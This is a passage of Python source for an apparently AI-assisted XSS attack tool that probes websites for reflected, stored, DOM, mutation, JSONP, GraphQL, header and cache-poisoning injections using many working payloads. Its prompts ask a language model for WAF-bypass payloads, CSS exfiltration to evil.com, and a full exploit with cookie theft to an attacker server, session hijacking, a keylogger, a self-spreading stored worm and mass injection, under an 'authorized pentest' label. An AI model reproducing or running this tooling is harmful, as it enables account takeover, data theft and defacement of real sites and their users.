        r'axios\.\w+\([\'"]([^\'"?#]+)[\'"]',
        r'\.open\([\'"](?:GET|POST)[\'"],\s*[\'"]([^\'"]+)[\'"]',
        r'url\s*[:=]\s*[\'"]([/][^\'"]+)[\'"]',
        r'[\'"](/api/[^\'"]+)[\'"]',
        r'[\'"](/v\d+/[^\'"]+)[\'"]',
        r'[\'"](/graphql[^\'"]*)[\'"]',
    ]:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url and abs_url not in eps:
                eps.append(abs_url)
    return eps[:20]


# ══════════════════════════════════════════════════════════════════════════════
# REFLECTION & CONTEXT ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════
def _check_reflection(body: str, payload: str) -> dict:
    result = {"reflected": False, "escaped": False, "partial": False,
              "snippet": "", "context": ""}
    if payload in body:
        result["reflected"] = True
        escaped_forms = [
            html_lib.escape(payload),
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace('"', "&quot;").replace("'", "&#x27;"),
            urllib.parse.quote(payload),
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
        ]
        result["escaped"] = any(ev in body for ev in escaped_forms)
        idx = body.find(payload)
        result["snippet"]  = body[max(0, idx - 150): idx + 300]
        result["context"]  = _injection_context(result["snippet"], payload)
        return result
    # Partial
    key_parts = [p for p in [
        payload[:20] if len(payload) > 20 else None,
        "alert(1)", "onerror=", "onload=", "ontoggle=",
        "javascript:", "<script", "onfocus",
    ] if p and p in payload and p in body]
    if key_parts:
        part = key_parts[0]
        idx  = body.find(part)
        result.update({"reflected": True, "partial": True, "escaped": False,
                        "snippet": body[max(0, idx - 100): idx + 200],
                        "context": "Partial reflection"})
    return result


def _injection_context(snippet: str, payload: str) -> str:
    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:80]
    if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL):
        return "JS context (inside <script>)"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):
        return "Event handler attribute"
    if re.search(r'(href|src|action|data)\s*=\s*["\'][^"\']*$', before):
        return "URL attribute (href/src)"
    if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):
        return "CSS context"
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "HTML attribute value"
    if re.search(r'<[a-zA-Z][^>]*$', before):
        return "Inside HTML tag"
    return "HTML body"


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 5 — HTML MUTATION VERIFICATION
# "Did the attack actually change the page?"
# ══════════════════════════════════════════════════════════════════════════════
def verify_html_mutation(target_url: str, param: str, payload: str,
                         method: str = "get", extra_data: dict = None) -> dict:
    """
    Use Playwright to:
    1. Load page WITHOUT payload → capture baseline rendered HTML + DOM snapshot
    2. Load page WITH payload → capture rendered HTML + DOM snapshot
    3. Compare: if DOM structure/content differs → attack changed the page
    4. Also detect JS execution (dialog), injected elements, new event listeners
    """
    result = {
        "confirmed": False, "html_changed": False,
        "dialog_fired": False, "dialog_msg": None,
        "injected_element": None, "dom_diff_summary": "",
        "screenshot_before": None, "screenshot_after": None,
        "error": None,
    }
    if not PLAYWRIGHT_OK:
        result["error"] = "Playwright not installed"
        return result

    def _build_url(with_payload):
        if method == "get":
            parsed = urllib.parse.urlparse(target_url)
            pdict  = dict(urllib.parse.parse_qsl(parsed.query))
            if with_payload:
                pdict[param] = payload
            return parsed._replace(query=urllib.parse.urlencode(pdict)).geturl()
        return target_url

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-setuid-sandbox",
                "--disable-dev-shm-usage", "--disable-gpu",
                "--disable-web-security", "--allow-running-insecure-content",
            ])
            ctx = browser.new_context(ignore_https_errors=True, java_script_enabled=True)

            def _make_page(fire_storage):
                pg = ctx.new_page()
                pg.add_init_script("""
                    window._xss_confirmed = false;
                    window._xss_msg = null;
                    ['alert','confirm','prompt'].forEach(function(fn){
                        var orig=window[fn];
                        window[fn]=function(m){
                            window._xss_confirmed=true;
                            window._xss_msg=String(m);
                            try{orig(m);}catch(e){}
                            return fn==='confirm'?true:(fn==='prompt'?'xss':undefined);
                        };
                    });
                """)
                fired = {"v": False, "m": ""}
                def _dlg(d):
                    fired["v"] = True
                    fired["m"] = d.message
                    try: d.dismiss()
                    except Exception: pass
                pg.on("dialog", _dlg)
                return pg, fired

            # ── Baseline (no payload) ──────────────────────────────────────
            pg_base, _ = _make_page(False)
            try:
                pg_base.goto(_build_url(False), wait_until="networkidle", timeout=12000)
            except Exception:
                try:
                    pg_base.goto(_build_url(False), wait_until="domcontentloaded", timeout=8000)
                except Exception:
                    pass
            pg_base.wait_for_timeout(1500)
            try:
                baseline_html  = pg_base.evaluate("document.body.innerHTML")
                baseline_count = pg_base.evaluate("document.querySelectorAll('*').length")
                result["screenshot_before"] = pg_base.screenshot(full_page=False)
            except Exception:
                baseline_html  = ""
                baseline_count = 0
            pg_base.close()

            # ── Attack page (with payload) ─────────────────────────────────
            pg_atk, fired = _make_page(True)
            try:
                if method == "get":
                    pg_atk.goto(_build_url(True), wait_until="networkidle", timeout=12000)
                else:
                    pg_atk.goto(target_url, wait_until="domcontentloaded", timeout=10000)
                    for fname, fval in (extra_data or {}).items():
                        try:
                            loc = pg_atk.locator(f"[name='{fname}']")
                            if loc.count() > 0:
                                loc.first.fill(str(fval))
                        except Exception:
                            pass
                    try:
                        loc = pg_atk.locator(f"[name='{param}']")
                        if loc.count() > 0:
                            loc.first.fill(payload)
                            loc.first.press("Enter")
                    except Exception:
                        pass
            except Exception:
                try:
                    pg_atk.goto(_build_url(True), wait_until="domcontentloaded", timeout=8000)
                except Exception:
                    pass

            pg_atk.wait_for_timeout(2500)

            # Check dialog
            if fired["v"]:
                result["confirmed"] = result["dialog_fired"] = True
                result["dialog_msg"] = fired["m"]
            try:
                if pg_atk.evaluate("window._xss_confirmed === true"):
                    result["confirmed"] = result["dialog_fired"] = True
                    result["dialog_msg"] = pg_atk.evaluate("window._xss_dialog_msg or window._xss_msg or ''")
            except Exception:
                pass

            # Check injected DOM elements
            try:
                injected = pg_atk.evaluate("""(function(){
                    var tags=['script','img','svg','details','video','audio','iframe','object','embed'];
                    for(var t of tags){
                        var els=document.querySelectorAll(
                            t+'[onerror],'+t+'[onload],'+t+'[ontoggle],'+t+'[onfocus],'+t+'[onmouseover]');
                        if(els.length>0)return els[0].outerHTML.slice(0,200);
                    }
                    // Check for injected text markers
                    var body=document.body.innerHTML;
                    if(body.includes('INJECTED_MARKER'))return 'HTML injection marker found';
                    return null;
                })()""")
                if injected:
                    result["confirmed"] = True
                    result["injected_element"] = injected
            except Exception:
                pass

            # HTML mutation check
            try:
                after_html  = pg_atk.evaluate("document.body.innerHTML")
                after_count = pg_atk.evaluate("document.querySelectorAll('*').length")
                result["screenshot_after"] = pg_atk.screenshot(full_page=False)

                if baseline_html and after_html:
                    # Count element delta
                    delta = abs(after_count - baseline_count)
                    # Check if dangerous tags appeared
                    dangerous_added = any(
                        tag not in baseline_html.lower() and tag in after_html.lower()
                        for tag in ["<script", "<svg", "<img", "<iframe", "onerror=",
                                    "onload=", "ontoggle=", "javascript:"]
                    )
                    content_changed = baseline_html[:500] != after_html[:500]

                    if delta > 2 or dangerous_added or content_changed:
                        result["html_changed"] = True
                        if not result["confirmed"]:
                            result["confirmed"] = dangerous_added  # only confirm if dangerous
                        result["dom_diff_summary"] = (
                            f"DOM element count changed by {delta}. "
                            + ("Dangerous tags injected! " if dangerous_added else "")
                            + ("Page content differs from baseline." if content_changed else "")
                        )
            except Exception:
                pass

            pg_atk.close()
            browser.close()

    except Exception as e:
        result["error"] = str(e)

    return result


# ══════════════════════════════════════════════════════════════════════════════
# INJECTION TESTING
# ══════════════════════════════════════════════════════════════════════════════
def test_one(url: str, param: str, payload: str, method: str = "get",
             extra_data: dict = None) -> dict:
    r = {"url": url, "param": param, "payload": payload,
         "method": method, "status": None,
         "reflected": False, "escaped": False, "partial": False,
         "context": "", "body_snippet": ""}
    try:
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            p_dict = dict(urllib.parse.parse_qsl(parsed.query))
            p_dict[param] = payload
            test_url = parsed._replace(query=urllib.parse.urlencode(p_dict)).geturl()
            resp = requests.get(test_url, headers=REQ_HEADERS, timeout=REQ_TIMEOUT,
                                allow_redirects=True)
        else:
            data = dict(extra_data or {})
            data[param] = payload
            resp = requests.post(url, data=data, headers=REQ_HEADERS,
                                 timeout=REQ_TIMEOUT, allow_redirects=True)
        r["status"] = resp.status_code
        ref = _check_reflection(resp.text, payload)
        r.update({"reflected": ref["reflected"], "escaped": ref.get("escaped", False),
                  "partial": ref.get("partial", False),
                  "body_snippet": ref.get("snippet", ""),
                  "context": ref.get("context", "")})
    except Exception as e:
        r["error"] = str(e)
    return r


def _do_mutation_verify(r: dict, term_ph, stats_phs, label: str, extra_data=None):
    """Run HTML mutation + JS execution verification."""
    log(f"  ↳ [{r['context']}] — verifying in browser (mutation + JS check)...",
        "html", term_ph, stats_phs)
    mv = verify_html_mutation(r["url"], r["param"], r["payload"],
                              r["method"], extra_data=extra_data)
    r["browser_confirmed"]  = mv["confirmed"]
    r["html_changed"]       = mv["html_changed"]
    r["dom_diff"]           = mv.get("dom_diff_summary", "")
    r["screenshot"]         = mv.get("screenshot_after") or mv.get("screenshot_before")
    r["screenshot_before"]  = mv.get("screenshot_before")
    r["screenshot_after"]   = mv.get("screenshot_after")
    r["dialog_msg"]         = mv.get("dialog_msg")
    r["injected_element"]   = mv.get("injected_element")
    r["browser_error"]      = mv.get("error")

    if mv["confirmed"]:
        st.session_state.vulns_found += 1
        proof = []
        if mv["dialog_fired"]:
            proof.append(f'JS executed — dialog: "{mv["dialog_msg"]}"')
        if mv["html_changed"]:
            proof.append(f"HTML MUTATED — {mv['dom_diff_summary']}")
        if mv["injected_element"]:
            proof.append(f"Injected: {mv['injected_element'][:80]}")
        log(f"🎯 CONFIRMED — {label} | {' | '.join(proof)}", "vuln", term_ph, stats_phs)
    elif mv["html_changed"]:
        log(f"  ↳ HTML CHANGED (no JS exec) — {mv['dom_diff_summary'][:80]}", "html", term_ph, stats_phs)
    else:
        log(f"  ↳ reflected but page unchanged in browser", "warn", term_ph, stats_phs)


def test_page(page: dict, payloads: list, focus_fields: list,
              term_ph, stats_phs) -> list:
    hits = []

    def _test_param(url, param, method, extra_data=None):
        st.session_state.points_found += 1
        # Prioritize payloads for focused fields
        ordered_payloads = payloads
        if focus_fields and param in focus_fields:
            ordered_payloads = payloads  # Already ranked from AI plan
        for payload in ordered_payloads[:20]:
            r = test_one(url, param, payload, method, extra_data)
            if r["reflected"] and not r["escaped"]:
                _do_mutation_verify(r, term_ph, stats_phs,
                                    f"{url[:60]} {method.upper()} {param}=[{payload[:40]}]",
                                    extra_data=extra_data)
                hits.append(r)
                return  # stop at first unescaped reflection
            elif r["reflected"]:
                log(f"  Escaped — {url[:50]} ?{param}", "warn", term_ph, stats_phs)
                return

    # URL params
    for param in page.get("params", []):
        _test_param(page["url"], param, "get")

    # Form fields
    for form in page.get("forms", []):
        field_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
        for field in form.get("fields", []):
            data = dict(field_data)
            _test_param(form["action"], field["name"], form["method"], data)

    return hits


# ══════════════════════════════════════════════════════════════════════════════
# STORED XSS — FIXED (fast: one submission per field, one sweep pass)
# ══════════════════════════════════════════════════════════════════════════════
def hunt_stored_xss(pages: list, payloads: list, term_ph, stats_phs) -> list:
    import time as _time
    hits = []
    storage_forms = [
        (page, form)
        for page in pages
        for form in page.get("forms", [])
        if form["method"] == "post"
    ]
    if not storage_forms:
        log("No POST forms — skipping stored XSS", "skip", term_ph, stats_phs)
        return hits

    log(f"Found {len(storage_forms)} POST form(s) — submitting markers (one per field, fast)", "hunt", term_ph, stats_phs)

    unique_id = f"xp{int(_time.time()) % 100000}"
    # Map: marker → (inject_url, field_name, payload)
    marker_map = {}

    # STEP 1 — Submit all markers quickly (parallel)
    def _submit(args):
        page, form, field, payload = args
        marker = f"{unique_id}x{len(marker_map)}"
        base_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
        data = dict(base_data)
        data[field["name"]] = marker + payload
        try:
            r = requests.post(form["action"], data=data, headers=REQ_HEADERS,
                              timeout=REQ_TIMEOUT, allow_redirects=True)
            return marker, form["action"], field["name"], payload, r.status_code
        except Exception:
            return marker, form["action"], field["name"], payload, 0

    jobs = []
    for page, form in storage_forms[:6]:
        for field in form.get("fields", [])[:3]:
            # Use best 3 payloads only (the AI-ranked ones come first)
            jobs.append((page, form, field, payloads[0]))

    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        for marker, inject_url, fname, payload, code in ex.map(_submit, jobs):
            marker_map[marker] = (inject_url, fname, payload)
            log(f"  → Submitted to {inject_url[:60]} field={fname} [{code}]", "hunt", term_ph, stats_phs)

    if not marker_map:
        return hits

    log(f"  Submitted {len(marker_map)} markers — sweeping all pages for persistence...", "hunt", term_ph, stats_phs)

    # STEP 2 — One sweep of all pages looking for any marker
    def _check_page(check_url):
        r2 = safe_req("get", check_url)
        if not r2:
            return []
        found = []
        for marker, (inject_url, fname, payload) in marker_map.items():
            if marker in r2.text:
                ref = _check_reflection(r2.text, payload)
                if ref["reflected"] and not ref.get("escaped"):
                    found.append((check_url, r2.text, ref, marker, inject_url, fname, payload))
        return found

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        results = list(ex.map(_check_page, [p["url"] for p in pages]))

    for page_results in results:
        for store_url, store_body, ref, marker, inject_url, fname, payload in page_results:
            log(f"  🎯 STORED — marker found on {store_url}", "vuln", term_ph, stats_phs)
            r_hit = {
                "url": store_url, "inject_url": inject_url,
                "param": fname, "payload": payload,
                "method": "stored-post", "status": 200,
                "reflected": True, "escaped": False, "partial": False,
                "context": f"STORED XSS — via {inject_url} field={fname}",
                "body_snippet": ref.get("snippet", store_body[:300]),
                "browser_confirmed": False,
                "severity": "CRITICAL — stored XSS persists for all visitors",
            }
            if PLAYWRIGHT_OK:
                log(f"  ↳ Verifying stored payload + HTML mutation on {store_url}...", "html", term_ph, stats_phs)
                mv = verify_html_mutation(store_url, fname, payload, "get")
                r_hit.update({
                    "browser_confirmed": mv["confirmed"],
                    "html_changed":      mv["html_changed"],
                    "dom_diff":          mv.get("dom_diff_summary", ""),
                    "screenshot":        mv.get("screenshot_after"),
                    "screenshot_before": mv.get("screenshot_before"),
                    "dialog_msg":        mv.get("dialog_msg"),
                })
                if mv["confirmed"] or mv["html_changed"]:
                    st.session_state.vulns_found += 1
                    log(f"  🎯 STORED XSS CONFIRMED + HTML MUTATED on {store_url}", "vuln", term_ph, stats_phs)
                else:
                    st.session_state.vulns_found += 1
                    log(f"  ⚠️  Stored (unescaped) but not browser-confirmed", "warn", term_ph, stats_phs)
            else:
                st.session_state.vulns_found += 1
            hits.append(r_hit)

    return hits


# ══════════════════════════════════════════════════════════════════════════════
# ADVANCED HUNTING — Parallel
# ══════════════════════════════════════════════════════════════════════════════
def hunt_cache_poisoning(target: str, term_ph, stats_phs) -> list:
    hits = []
    marker = "CACHEPOISONTEST9182"
    headers_to_test = {
        "X-Forwarded-Host":    f"{marker}.evil.com",
        "X-Original-URL":      f"/{marker}",
        "X-Host":              f"{marker}.evil.com",
        "X-HTTP-Host-Override":f"{marker}.evil.com",
        "X-Forwarded-Server":  f"{marker}.evil.com",
    }
    def _test_hdr(args):
        hname, hval = args
        try:
            h = dict(REQ_HEADERS)
            h[hname] = hval
            resp = requests.get(target, headers=h, timeout=REQ_TIMEOUT)
            if marker in resp.text:
                return hname, hval, resp.status_code, resp.text
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        for res in ex.map(_test_hdr, headers_to_test.items()):
            if res:
                hname, hval, code, body = res
                idx = body.find(marker)
                hits.append({
                    "url": target, "param": hname, "payload": hval,
                    "method": "header", "status": code,
                    "reflected": True, "escaped": False, "partial": False,
                    "context": f"Cache-poisonable header ({hname})",
                    "body_snippet": body[max(0, idx-50): idx+100],
                    "browser_confirmed": False,
                    "severity": "HIGH — cache poisoning → stored XSS possible",
                })
                log(f"CACHE POISONING via {hname} — reflected!", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_cors_xss(target: str, infra: dict, term_ph, stats_phs) -> list:
    hits = []
    if infra.get("cors_vuln"):
        hit = {
            "url": target, "param": "Origin header",
            "payload": f"Origin: https://evil.com",
            "method": "header", "status": 200,
            "reflected": True, "escaped": False, "partial": False,
            "context": "CORS misconfiguration",
            "body_snippet": infra["cors_vuln"],
            "browser_confirmed": False,
            "severity": f"CRITICAL — CORS: {infra['cors_vuln']}",
        }
        hits.append(hit)
        log(f"CORS vuln confirmed: {infra['cors_vuln']}", "vuln", term_ph, stats_phs)
        st.session_state.vulns_found += 1
    return hits


def hunt_jsonp(pages: list, term_ph, stats_phs) -> list:
    hits = []
    all_eps = list({ep for p in pages for ep in p.get("jsonp_endpoints", [])})
    cb_payloads = ["alert(1)//", "alert(document.domain)//", "};alert(1);//", "alert`1`//"]

    def _test_ep(ep):
        for cb in cb_payloads:
            try:
                sep = "&" if "?" in ep else "?"
                test_url = ep + sep + "callback=" + urllib.parse.quote(cb)
                resp = requests.get(test_url, headers=REQ_HEADERS, timeout=REQ_TIMEOUT)
                if cb in resp.text or cb[:10] in resp.text:
                    return ep, cb, resp.status_code, resp.text[:300]
            except Exception:
                pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for res in ex.map(_test_ep, all_eps):
            if res:
                ep, cb, code, body = res
                hits.append({
                    "url": ep, "param": "callback", "payload": cb,
                    "method": "get", "status": code,
                    "reflected": True, "escaped": False, "partial": False,
                    "context": "JSONP callback injection",
                    "body_snippet": body, "browser_confirmed": False,
                    "severity": "HIGH — JSONP XSS",
                })
                log(f"JSONP injection: {ep}", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_mutation_xss(pages: list, plan: dict, term_ph, stats_phs) -> list:
    """Test mutation XSS payloads that bypass innerHTML sanitizers."""
    hits = []
    mxss_payloads = [
        '<listing><img src=1 onerror=alert(1)></listing>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<!--<img src="--><img src=x onerror=alert(1)>',
        '<table><td><img src=x onerror=alert(1)></table>',
        '<select><option><img src=x onerror=alert(1)></option></select>',
        '<form><math><mtext></form><form><mglyph><svg><mtext></svg><img src=x onerror=alert(1)>',
        '<math href="javascript:alert(1)">click</math>',
        '<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>',
    ] + plan.get("mutation_xss_candidates", [])

    for page in pages[:5]:
        for param in page.get("params", [])[:3]:
            for payload in mxss_payloads[:5]:
                r = test_one(page["url"], param, payload, "get")
                if r["reflected"] and not r["escaped"]:
                    log(f"mXSS candidate: {page['url']} ?{param}", "warn", term_ph, stats_phs)
                    _do_mutation_verify(r, term_ph, stats_phs,
                                       f"mXSS {page['url']} ?{param}")
                    hits.append(r)
                    break
    return hits


def hunt_dom_xss(pages: list, payloads: list, term_ph, stats_phs) -> list:
    hits = []
    if not PLAYWRIGHT_OK:
        log("Playwright not available — skipping DOM XSS browser hunt", "skip", term_ph, stats_phs)
        return hits

    sink_pages = [p for p in pages if p.get("dom_sinks")] or pages[:3]
    dom_payloads = [
        '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>', "javascript:alert(1)",
        '<details open ontoggle=alert(1)>',
    ]

    for page in sink_pages[:4]:
        encoded = urllib.parse.quote(dom_payloads[0])
        test_urls = [
            page["url"].split("#")[0] + "#" + encoded,
            page["url"] + ("&" if "?" in page["url"] else "?") + "q=" + encoded,
        ]
        for test_url in test_urls:
            try:
                with sync_playwright() as pw:
                    browser = pw.chromium.launch(headless=True, args=[
                        "--no-sandbox", "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage", "--disable-gpu",
                        "--disable-web-security",
                    ])
                    ctx = browser.new_context(ignore_https_errors=True)
                    pg  = ctx.new_page()
                    pg.add_init_script("window._dom_xss_hit=false;var _oa=window.alert;window.alert=function(m){window._dom_xss_hit=true;window._dom_xss_msg=String(m);try{_oa(m);}catch(e){}};")
                    fired = {"v": False, "m": ""}
                    def _dlg(d):
                        fired["v"] = True; fired["m"] = d.message
                        try: d.dismiss()
                        except Exception: pass
                    pg.on("dialog", _dlg)
                    try:
                        pg.goto(test_url, wait_until="networkidle", timeout=10000)
                    except Exception:
                        try: pg.goto(test_url, wait_until="domcontentloaded", timeout=6000)
                        except Exception: pass
                    pg.wait_for_timeout(2000)
                    confirmed = fired["v"]
                    if not confirmed:
                        try: confirmed = pg.evaluate("window._dom_xss_hit===true")
                        except Exception: pass
                    if confirmed:
                        msg = fired["m"]
                        try: msg = pg.evaluate("window._dom_xss_msg||''")
                        except Exception: pass
                        shot = None
                        try: shot = pg.screenshot()
                        except Exception: pass
                        hits.append({
                            "url": test_url, "param": "DOM source (hash/search)",
                            "payload": dom_payloads[0], "method": "get",
                            "status": 200, "reflected": True, "escaped": False,
                            "partial": False, "context": "DOM-based XSS",
                            "body_snippet": "", "browser_confirmed": True,
                            "dialog_msg": msg, "screenshot": shot,
                            "severity": "CRITICAL — DOM XSS browser-confirmed",
                        })
                        st.session_state.vulns_found += 1
                        log(f"🎯 DOM XSS CONFIRMED — {test_url[:80]}", "vuln", term_ph, stats_phs)
                    browser.close()
                    if confirmed:
                        break
            except Exception:
                pass
    return hits


def hunt_header_injection(target: str, term_ph, stats_phs) -> list:
    hits = []
    probe = "HEADERINJECT9182"
    test_headers = {
        "X-Forwarded-For":  probe,
        "X-Real-IP":        probe,
        "Referer":          f"https://evil.com/{probe}",
        "X-Custom-Header":  f'<script>alert("{probe}")</script>',
    }
    def _test_hdr(args):
        hname, hval = args
        try:
            h = dict(REQ_HEADERS)
            h[hname] = hval
            resp = requests.get(target, headers=h, timeout=REQ_TIMEOUT)
            if probe in resp.text:
                idx = resp.text.find(probe)
                return hname, hval, resp.status_code, resp.text[max(0,idx-50):idx+100]
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for res in ex.map(_test_hdr, test_headers.items()):
            if res:
                hname, hval, code, snip = res
                hits.append({
                    "url": target, "param": hname, "payload": hval,
                    "method": "header", "status": code,
                    "reflected": True, "escaped": False, "partial": False,
                    "context": f"HTTP header ({hname})",
                    "body_snippet": snip, "browser_confirmed": False,
                })
                log(f"Header injection — {hname} reflected", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_graphql(target: str, pages: list, term_ph, stats_phs) -> list:
    hits = []
    parsed_target = urllib.parse.urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"
    gql_candidates = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/graphiql"]
    js_eps = [ep for p in pages for ep in p.get("js_endpoints", [])]
    gql_from_js = [ep for ep in js_eps if "graphql" in ep.lower() or "/gql" in ep.lower()]
    endpoints = list({base + c for c in gql_candidates} | set(gql_from_js))
    hdrs = {**REQ_HEADERS, "Content-Type": "application/json", "Accept": "application/json"}
    introspection = json.dumps({"query": "{ __schema { types { name } } }"})

    def _test_gql(ep):
        try:
            resp = requests.post(ep, data=introspection, headers=hdrs, timeout=REQ_TIMEOUT)
            if resp.status_code == 200 and "__schema" in resp.text:
                return ep, resp.text
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        for res in ex.map(_test_gql, endpoints[:8]):
            if res:
                ep, schema_txt = res
                log(f"GraphQL endpoint found: {ep}", "vuln", term_ph, stats_phs)
                for xss_pl in ['<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']:
                    payload = json.dumps({"query":'query($x:String){__typename}', "variables":{"x":xss_pl}})
                    try:
                        r2 = requests.post(ep, data=payload, headers=hdrs, timeout=REQ_TIMEOUT)
                        if xss_pl in r2.text:
                            hits.append({
                                "url": ep, "param": "GraphQL variables",
                                "payload": xss_pl, "method": "post",
                                "status": r2.status_code,
                                "reflected": True, "escaped": False, "partial": False,
                                "context": "GraphQL variable reflection",
                                "body_snippet": r2.text[:300], "browser_confirmed": False,
                                "severity": "HIGH — GraphQL XSS",
                            })
                            st.session_state.vulns_found += 1
                            log(f"GraphQL XSS: {ep}", "vuln", term_ph, stats_phs)
                            break
                    except Exception:
                        pass
    return hits


# ══════════════════════════════════════════════════════════════════════════════
# AI: PAYLOAD GENERATION
# ══════════════════════════════════════════════════════════════════════════════
def ai_generate_payloads(client, target, user_payload, infra, plan,
                         dom_sinks, template_engine, pages) -> list:
    waf = infra.get("waf", "")
    csp = infra.get("csp", "")
    tech = infra.get("tech", [])

    ctx_blocks = []
    for p in pages[:5]:
        blk = f"URL: {p['url']}\n"
        if p.get("params"):
            blk += f"  GET params: {p['params']}\n"
        for fm in p.get("forms", [])[:2]:
            blk += f"  Form {fm['method'].upper()} → {fm['action']} fields={[x['name'] for x in fm['fields']]}\n"
        if p.get("dom_sinks"):
            blk += "  DOM sinks:\n" + "\n".join(f"    {s[:80]}" for s in p["dom_sinks"][:3]) + "\n"
        if p.get("inline_js"):
            blk += f"  Inline JS:\n{p['inline_js'][:300]}\n"
        blk += f"  HTML (first 500c):\n{p['html'][:500]}\n"
        ctx_blocks.append(blk)

    ai_top = plan.get("top_payloads", [])
    ai_plan_summary = plan.get("attack_summary", "")
    waf_strategy    = plan.get("waf_bypass_strategy", "")

    prompt = f"""You are the world's best XSS researcher. Authorized pentest against {target}.
Generate 30 payloads PRECISELY adapted to this target.

USER GOAL: {user_payload}
ATTACK PLAN: {ai_plan_summary}
WAF: {waf or 'none'} — bypass: {waf_strategy}
CSP: {csp or 'NONE'} — bypasses available: {infra.get('csp_bypasses', [])}
TECH: {tech}
TEMPLATE ENGINE: {template_engine or 'unknown'}
DOM SINKS: {', '.join(dom_sinks[:5]) if dom_sinks else 'none'}

=== PAGE CONTEXT ===
{chr(10).join(ctx_blocks)[:3500]}

=== PAYLOAD TIERS (generate 5 per tier) ===

TIER 1 — Context-exact (adapt to the EXACT HTML contexts above):
- Break out of detected attribute quotes
- Escape JS string delimiters if inside <script>
- Target specific DOM sinks found

TIER 2 — Modern/exotic (companies are hardened against basic payloads):
- Mutation XSS: <listing>, <select><option>, <table><td> parser tricks
- DOM clobbering: <form id=x><input name=attributes>
- Import map injection: <script type=importmap>
- Trusted Types bypass patterns
- Angular/Vue/React template injection (if detected)
- CSS exfil: input[value^="a"]{{background:url(//evil.com)}}

TIER 3 — WAF bypass (must slip past {waf or 'none'}):
- Encoding, case-mixing, whitespace tricks
- No-paren: onerror=alert`1`, throw onerror=alert,1
- atob(): eval(atob('BASE64'))
- String.fromCharCode()
- Tag splitting / null bytes

TIER 4 — Stored XSS survivors (survive server-side processing):
- Unicode fullwidth: ＜script＞
- Double encoding: %253Cscript%253E
- Null byte: %00<script>
- HTML entity: &#x3C;script&#x3E;

TIER 5 — HTML-only injection (prove impact even without JS exec):
- <h1>DEFACED</h1>, <iframe>, <meta refresh>, phishing overlays

TIER 6 — Chained / advanced:
- javascript: URI in href/src/action/formaction
- data: URI
- srcdoc iframe
- JSONP callback payloads

Output ONLY a raw JSON array of 30 strings. Zero markdown."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000, temperature=0.7,
        )
        text = resp.choices[0].message.content.strip()
        text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
        m = re.search(r"\[.*\]", text, re.DOTALL)
        if m:
            parsed = json.loads(m.group())
            if isinstance(parsed, list) and len(parsed) >= 5:
                # Merge: AI plan top payloads first, then fresh AI payloads, then base
                return list(dict.fromkeys(
                    ai_top + [str(p) for p in parsed] + BASE_PAYLOADS
                ))
    except Exception:
        pass
    return list(dict.fromkeys(ai_top + BASE_PAYLOADS))


# ══════════════════════════════════════════════════════════════════════════════
# AI: EXPLOIT GENERATION
# ══════════════════════════════════════════════════════════════════════════════
def ai_write_exploit(client, findings: list, target: str, blind_url: str) -> str:
    if not findings:
        return ""
    confirmed = [f for f in findings if f.get("browser_confirmed")]
    best = confirmed[0] if confirmed else findings[0]
    fsum = json.dumps([{
        "url": f["url"], "param": f["param"], "payload": f["payload"],
        "context": f.get("context",""), "method": f["method"],
        "confirmed": f.get("browser_confirmed", False),
        "html_changed": f.get("html_changed", False),
    } for f in findings[:8]], indent=2)

    prompt = f"""Write a complete Python exploit script for this authorized pentest.

Target: {target}
Confirmed findings:
{fsum}

Best finding:
  URL: {best['url']}
  Param: {best['param']}
  Method: {best['method'].upper()}
  Context: {best.get('context','HTML body')}
  Payload: {best['payload']}
  Confirmed: {best.get('browser_confirmed', False)}
  HTML mutated: {best.get('html_changed', False)}
{"  Blind URL: " + blind_url if blind_url else ""}

Write a complete Python exploit with:
1. verify() — confirm vuln is live, check HTTP response + payload reflection
2. steal_cookies() — inject fetch("attacker/?c="+document.cookie) variant
3. session_hijack() — use stolen cookie for authenticated requests  
4. html_defacement() — inject visible HTML changes to prove impact
5. keylogger() — inject keypress event listener, exfil to attacker server
6. stored_worm() — if stored vuln, payload that re-injects itself
7. payload_variants() — 10 WAF bypass variants of the working payload
8. mass_inject() — iterate all vulnerable params across all pages

Use: requests, argparse, http.server, base64, threading, re
argparse so each module runs standalone: --verify, --steal-cookies, etc.

Output ONLY raw Python code, no markdown."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2500, temperature=0.05,
        )
        return re.sub(r"```python\n?|```", "",
                      resp.choices[0].message.content.strip()).strip()
    except Exception as e:
